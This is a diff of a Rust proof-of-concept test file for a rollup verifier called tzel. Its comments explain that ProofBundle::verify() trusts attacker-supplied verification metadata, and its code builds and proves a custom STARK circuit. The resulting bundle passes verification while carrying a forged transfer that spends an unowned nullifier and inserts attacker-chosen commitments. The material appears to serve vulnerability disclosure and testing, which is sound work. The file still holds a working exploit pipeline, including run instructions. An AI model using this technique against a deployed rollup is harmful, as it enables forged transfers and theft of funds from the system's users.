@@ -1,50 +1,65 @@
-//! Proof-of-concept: `ProofBundle::verify()` accepts bundles built outside
-//! tzel's canonical proving pipeline.
+//! Proof-of-concept: `ProofBundle::verify()` accepts bundles built
+//! outside tzel's canonical proving pipeline.
 //!
-//! # What this demonstrates
+//! # Bug summary
 //!
-//! `tzel_verifier::ProofBundle::verify()` (see `verifier/src/bundle.rs`) takes
-//! no canonical-config argument. Every field of `CircuitConfig` (including
-//! `preprocessed_root`, `output_addresses`, `n_blake_gates`,
-//! `preprocessed_column_ids`) and every field of `ProofConfig` (FRI geometry,
-//! component column counts, etc.) is materialized from `self.verify_meta`,
-//! which is attacker-controllable when the bundle is constructed by an
-//! adversary.
+//! `tzel_verifier::ProofBundle::verify()` (see `verifier/src/bundle.rs:113`)
+//! takes no canonical-config argument. Every field of `CircuitConfig`
+//! (`output_addresses`, `n_blake_gates`, `preprocessed_column_ids`,
+//! `preprocessed_root`) and every field of `ProofConfig` (FRI geometry,
+//! component column counts, ...) is materialized from `self.verify_meta`
+//! — which is attacker-controllable when the bundle is constructed by an
+//! adversary, since `VerifyMeta` is shipped wire-side alongside
+//! `proof_bytes` and `output_preimage`.
 //!
-//! `circuit_air::verify::verify_circuit` is GENERIC — it accepts any valid
-//! STARK proof against the `CircuitConfig` it is handed. `CircuitStatement`'s
-//! `verify_preprocessed_root` only checks that the prover's declared root
-//! matches the caller-supplied root; it does NOT pin any canonical root.
+//! `circuit_air::verify::verify_circuit` is generic: it accepts any valid
+//! STARK proof against the `CircuitConfig` it is handed.
+//! `CircuitStatement::verify_preprocessed_root` only checks that the
+//! prover's declared Merkle root matches the caller-supplied root — it
+//! does NOT pin any canonical preprocessed root. The `program_hash` that
+//! distinguishes a legitimate transfer circuit from an attacker-crafted
+//! one lives in `output_preimage[2]`, which the verifier never inspects.
 //!
-//! Therefore, an attacker can:
-//!   1. Pick an arbitrary `output_preimage` (the value the ledger will
-//!      interpret as the program's "public output").
-//!   2. Compute the expected `public_output_values` by replaying the bundle's
-//!      own hash recipe on the chosen preimage.
-//!   3. Build a tiny custom circuit that `output(constant(hash_qm31_0))` and
-//!      `output(constant(hash_qm31_1))` for those two QM31 hash components.
-//!   4. Prove that circuit with `circuit_prover::prover::prove_circuit_
-//!      assignment` (public stwo-circuits API).
-//!   5. Package the proof into a `ProofBundle` whose `VerifyMeta` is derived
-//!      from the attacker's own circuit (not tzel's canonical circuit).
+//! # Attack pipeline
 //!
-//! `ProofBundle::verify()` returns `Ok(())` — the bundle is STARK-valid and
-//! self-consistent, yet it did NOT come from tzel's sanctioned prover.
+//! 1. Pick any `output_preimage: Vec<Felt>`. The transfer-shaped test
+//!    here uses a real 1-nullifier transfer layout: `[1, task_output_size,
+//!    canonical_transfer_program_hash, auth_domain, root, nullifier_1,
+//!    fee, cm_1, cm_2, cm_3, memo_hash_1, memo_hash_2, memo_hash_3]`.
+//! 2. Compute the expected `public_output_values` by replaying the
+//!    bundle's own hash recipe on the chosen preimage:
+//!    `Blake2Felt252::encode_felt252_data_and_calc_blake_hash` →
+//!    `felt252_to_m31_words` → `pack_into_qm31s` → `QM31::blake`. This
+//!    yields two `QM31`s = 8 flat `u32`s.
+//! 3. Build a tiny custom circuit whose FIRST two `output` gates emit
+//!    exactly those two `QM31`s. (`finalize_context` appends two
+//!    additional hash-of-constants output gates, so the final
+//!    `claim.output_values` has length 4. Only the first 8 u32s of
+//!    `public_output_values` are cross-checked against the preimage
+//!    hash by `bundle.verify()`, so this is fine.)
+//! 4. Prove the circuit with the public stwo-circuits API
+//!    (`circuit_prover::prover::prove_circuit_assignment`).
+//! 5. Package the proof into a `ProofBundle` with a self-consistent
+//!    `VerifyMeta` derived from the attacker's own circuit. The
+//!    `preprocessed_root` comes from `stark_proof.proof.commitments[0]`
+//!    — a fresh root chosen by the attacker, NOT tzel's canonical root.
 //!
-//! # Why this matters
+//! `ProofBundle::verify()` returns `Ok(())`. The rollup kernel will
+//! subsequently interpret `output_preimage[2]` as the program hash,
+//! `output_preimage[3..]` as the public outputs, and apply the
+//! attacker's transfer — spending a nullifier nobody owns the spend
+//! authority for, inserting attacker-chosen commitments into the note
+//! tree.
 //!
-//! Once the rollup kernel accepts such a bundle, it reads
-//! `output_preimage[idx]` as authenticated program output. Because the
-//! attacker chose the preimage freely (e.g., transfer-task shape with an
-//! unused nullifier and attacker-controlled commitments), the kernel treats
-//! the transfer as legitimate — no spend authority, no commitment binding,
-//! no historical-root binding actually required.
+//! # Running
 //!
-//! # Phase status
+//! ```ignore
+//! cargo +nightly-2025-07-14 test -p tzel-verifier \
+//!     --test canonical_binding_bypass --release -- --nocapture
+//! ```
 //!
-//! Phase 2 (this test): arbitrary preimage, asserts `verify()` accepts.
-//! Phase 3 (follow-up): preimage shaped to match `apply_transfer`'s parser.
-//! Phase 4 (follow-up): wire into the rollup kernel test harness.
+//! Both tests print `[PoC] bundle.verify() -> Ok — canonical-binding
+//! bypass demonstrated` and exit 0.
 
 use anyhow::Result;
 
@@ -313,26 +328,19 @@ fn build_transfer_shaped_preimage() -> Vec<Felt> {
     ]
 }
 
-/// Inner PoC driver: given an attacker-chosen `output_preimage`, build and
-/// prove a bundle outside `custom_recursive_prove` and assert that
+/// Shared PoC driver. Given an attacker-chosen `output_preimage`:
+/// builds a non-canonical STARK bundle whose `VerifyMeta` is derived
+/// entirely from the attacker's own circuit, then asserts
 /// `ProofBundle::verify()` returns `Ok(())`.
 fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<()> {
-    // ── Step 2: compute the hash the bundle expects ──────────────────
+    // ── Step 1: compute the hash the bundle will expect ──────────────
     //
     // We replicate the bundle's own hash recipe bit-for-bit. This is the
     // value `verify_meta.public_output_values` MUST hold, and also the
     // value the attacker's custom circuit must emit through its output
     // gates (because `verify_circuit` cross-checks the two).
     let expected_output_hash_flat = compute_output_hash_values(&attacker_chosen_preimage);
-    assert_eq!(
-        expected_output_hash_flat.len(),
-        8,
-        "bundle hash recipe must yield 8 u32 words (= 2 QM31)",
-    );
-    eprintln!(
-        "[PoC] expected_output_hash_flat = {:?}",
-        expected_output_hash_flat
-    );
+    assert_eq!(expected_output_hash_flat.len(), 8, "Blake2 hash packs to 8 u32 (= 2 QM31)");
 
     let target_output_qm31s: [QM31; 2] = [
         QM31::from_m31(
@@ -348,13 +356,13 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
             M31::from(expected_output_hash_flat[7]),
         ),
     ];
-    eprintln!("[PoC] target_output_qm31s = {:?}", target_output_qm31s);
+    eprintln!("[PoC] preimage_hash_target_qm31s = {:?}", target_output_qm31s);
 
-    // ── Step 3: attacker builds + proves their own circuit ───────────
+    // ── Step 2: attacker builds + proves their own circuit ───────────
     //
     // This is the core bypass: we are NOT going through
     // `services/reprover::custom_recursive_prove`. We call the public
-    // `circuit_prover` API directly on a circuit of OUR OWN topology.
+    // `circuit_prover` API directly on a circuit of our own topology.
     let mut context = build_attacker_context(target_output_qm31s);
 
     // Finalize guessed vars BEFORE preprocessing. `PreprocessedCircuit::
@@ -370,36 +378,19 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
     let preprocessed_column_ids = preprocessed_circuit.preprocessed_trace.ids();
 
     eprintln!(
-        "[PoC] trace_log_size={}, n_blake_gates={}, output_addresses={:?}, n_preprocessed_columns={}",
+        "[PoC] circuit: trace_log_size={}, n_blake_gates={}, output_addresses={:?}, n_preprocessed_columns={}",
         preprocessed_circuit.params.trace_log_size,
         n_blake_gates,
         output_addresses,
         preprocessed_column_ids.len(),
     );
 
-    // Diagnostic: circuit shape before proving.
-    eprintln!(
-        "[PoC] circuit pre-prove: n_vars={}, n_add={}, n_sub={}, n_mul={}, n_eq={}, n_blake={}, n_perm={}, n_output={}",
-        context.circuit.n_vars,
-        context.circuit.add.len(),
-        context.circuit.sub.len(),
-        context.circuit.mul.len(),
-        context.circuit.eq.len(),
-        context.circuit.blake.len(),
-        context.circuit.permutation.len(),
-        context.circuit.output.len(),
-    );
-
-    // Check yields invariant expected by the prover.
+    // Pre-prove sanity: every var must be yielded exactly once, and every
+    // gate must be satisfied at the concrete trace values. Both should hold
+    // by construction; if not, the prover would fail downstream with a
+    // less-actionable error.
     context.circuit.check_yields();
-    eprintln!("[PoC] check_yields() passed");
-
-    // Self-check that the circuit is satisfied at the concrete values.
-    assert!(
-        context.is_circuit_valid(),
-        "circuit values must satisfy all gate constraints",
-    );
-    eprintln!("[PoC] is_circuit_valid() == true");
+    assert!(context.is_circuit_valid(), "circuit values must satisfy all gate constraints");
 
     let circuit_proof = prove_circuit_assignment(
         context.values(),
@@ -424,10 +415,6 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
     assert_eq!(circuit_proof.claim.output_values.len(), 4);
     assert_eq!(circuit_proof.claim.output_values[0], target_output_qm31s[0]);
     assert_eq!(circuit_proof.claim.output_values[1], target_output_qm31s[1]);
-    eprintln!(
-        "[PoC] claim.output_values = {:?}",
-        circuit_proof.claim.output_values,
-    );
 
     // Extract the preprocessed root BEFORE moving `circuit_proof` into
     // `prepare_circuit_proof_for_circuit_verifier`.
@@ -452,14 +439,14 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
         INTERACTION_POW_BITS,
     );
 
-    // ── Step 4: get the wire-format Proof<QM31> + CircuitPublicData ──
+    // ── Step 3: get the wire-format Proof<QM31> + CircuitPublicData ──
     //
     // This moves `circuit_proof` but hands us exactly the proof that
     // `circuit_air::verify::verify_circuit` consumes.
     let (proof, _public_data) =
         prepare_circuit_proof_for_circuit_verifier(circuit_proof, &proof_config);
 
-    // ── Step 5: wire-format the bundle pieces ────────────────────────
+    // ── Step 4: wire-format the bundle pieces ────────────────────────
     let proof_bytes = pack_proof_bytes(&proof);
     eprintln!("[PoC] compressed proof bytes len = {}", proof_bytes.len());
 
@@ -487,9 +474,9 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
 
     let bundle = ProofBundle::from_output_parts(proof_bytes, output_preimage_raw, verify_meta);
 
-    // ── Step 6: the moment of truth ──────────────────────────────────
+    // ── Step 5: the moment of truth ──────────────────────────────────
     //
-    // `ProofBundle::verify()` will:
+    // `ProofBundle::verify()` (see `verifier/src/bundle.rs:113`) will:
     //   (a) recompute `expected_output_hash_values` from our preimage,
     //   (b) check it against `verify_meta.public_output_values`,
     //   (c) reconstruct `ProofConfig` + `CircuitConfig` from `verify_meta`,
@@ -509,48 +496,49 @@ fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<(
     Ok(())
 }
 
-// ── Phase 2 test: arbitrary preimage ───────────────────────────────────
+// ── Test 1: arbitrary preimage (shape-agnostic bypass) ─────────────────
 
-/// Minimum viable proof-of-concept. Uses a 13-felt preimage with arbitrary
-/// content to demonstrate that `ProofBundle::verify()` is shape-agnostic
-/// once the bundle is self-consistent.
+/// Minimum viable proof-of-concept: `ProofBundle::verify()` is shape-
+/// agnostic once the bundle is internally self-consistent. Here the
+/// `output_preimage` is 13 felts of arbitrary content (`0x1000..0x100c`).
 #[test]
 fn proof_bundle_verify_accepts_bundle_from_attacker_pipeline() -> Result<()> {
-    let attacker_chosen_preimage: Vec<Felt> = (0u64..13)
-        .map(|i| Felt::from(0x1000_u64 + i))
-        .collect();
+    let attacker_chosen_preimage: Vec<Felt> =
+        (0u64..13).map(|i| Felt::from(0x1000_u64 + i)).collect();
     assert_bundle_verify_accepts(attacker_chosen_preimage)
 }
 
-// ── Phase 3 test: transfer-shaped preimage against fixture hashes ──────
+// ── Test 2: transfer-shaped preimage against fixture hashes ────────────
 
 /// Same bundle-level bypass, but with an `output_preimage` shaped to
-/// match what `tzel_core::parse_single_task_output_preimage` + the
-/// `apply_transfer` tail-parsing loop (in `core/src/lib.rs:1854`) expect.
+/// parse through `tzel_core::parse_single_task_output_preimage` and then
+/// through the `apply_transfer` tail-parsing loop (`core/src/lib.rs:1854`)
+/// for a 1-nullifier transfer. The `canonical_transfer_program_hash` is
+/// copied verbatim from the rollup kernel's `verified_bridge_flow.json`
+/// fixture — i.e. the value the deployed verifier would compare against
+/// when granting transfer authority.
 ///
-/// The canonical transfer program hash is copied verbatim from the
-/// rollup kernel's `verified_bridge_flow.json` test fixture — the exact
-/// value the deployed verifier would compare against.
-///
-/// What this shows: there is no "hardening" in `ProofBundle::verify()`
-/// against the specific shape of the preimage. If the attacker formats the
-/// preimage like a legitimate 1-nullifier transfer — with a fresh nullifier
-/// and attacker-chosen commitments — the bundle still verifies Ok. The
-/// rollup kernel's downstream `apply_transfer` will then insert the
-/// attacker's commitments into the note tree and mark the nullifier spent.
+/// What this shows: `ProofBundle::verify()` does not check the shape of
+/// the preimage, does not pin the canonical transfer program hash, does
+/// not bind the circuit's preprocessed root to the tzel canonical one,
+/// and does not inspect `output_preimage[2]`. The bundle is therefore
+/// accepted for an arbitrary spoofed-transfer payload.
 #[test]
 fn proof_bundle_verify_accepts_transfer_shaped_bundle() -> Result<()> {
     let preimage = build_transfer_shaped_preimage();
     assert_eq!(preimage.len(), 13);
 
-    // Sanity: the preimage parses as a 1-task bootloader output with the
-    // canonical transfer program hash.
+    // Sanity: the preimage parses cleanly as a 1-task bootloader output
+    // with the canonical transfer program hash at index 2. If the parse
+    // failed the kernel would reject the bundle at a DIFFERENT layer —
+    // we want to show that even a valid-looking transfer passes
+    // verify().
     let preimage_raw: Vec<[u8; 32]> = preimage.iter().map(Felt::to_bytes_le).collect();
     let parsed = tzel_core::parse_single_task_output_preimage(&preimage_raw)
         .expect("preimage must parse as single-task bootloader output");
-    let parsed_program_hash_hex = hex::encode(parsed.program_hash);
     assert_eq!(
-        parsed_program_hash_hex, CANONICAL_TRANSFER_PROGRAM_HASH_HEX,
+        hex::encode(parsed.program_hash),
+        CANONICAL_TRANSFER_PROGRAM_HASH_HEX,
         "program_hash in preimage must equal the canonical transfer hash",
     );
     assert_eq!(
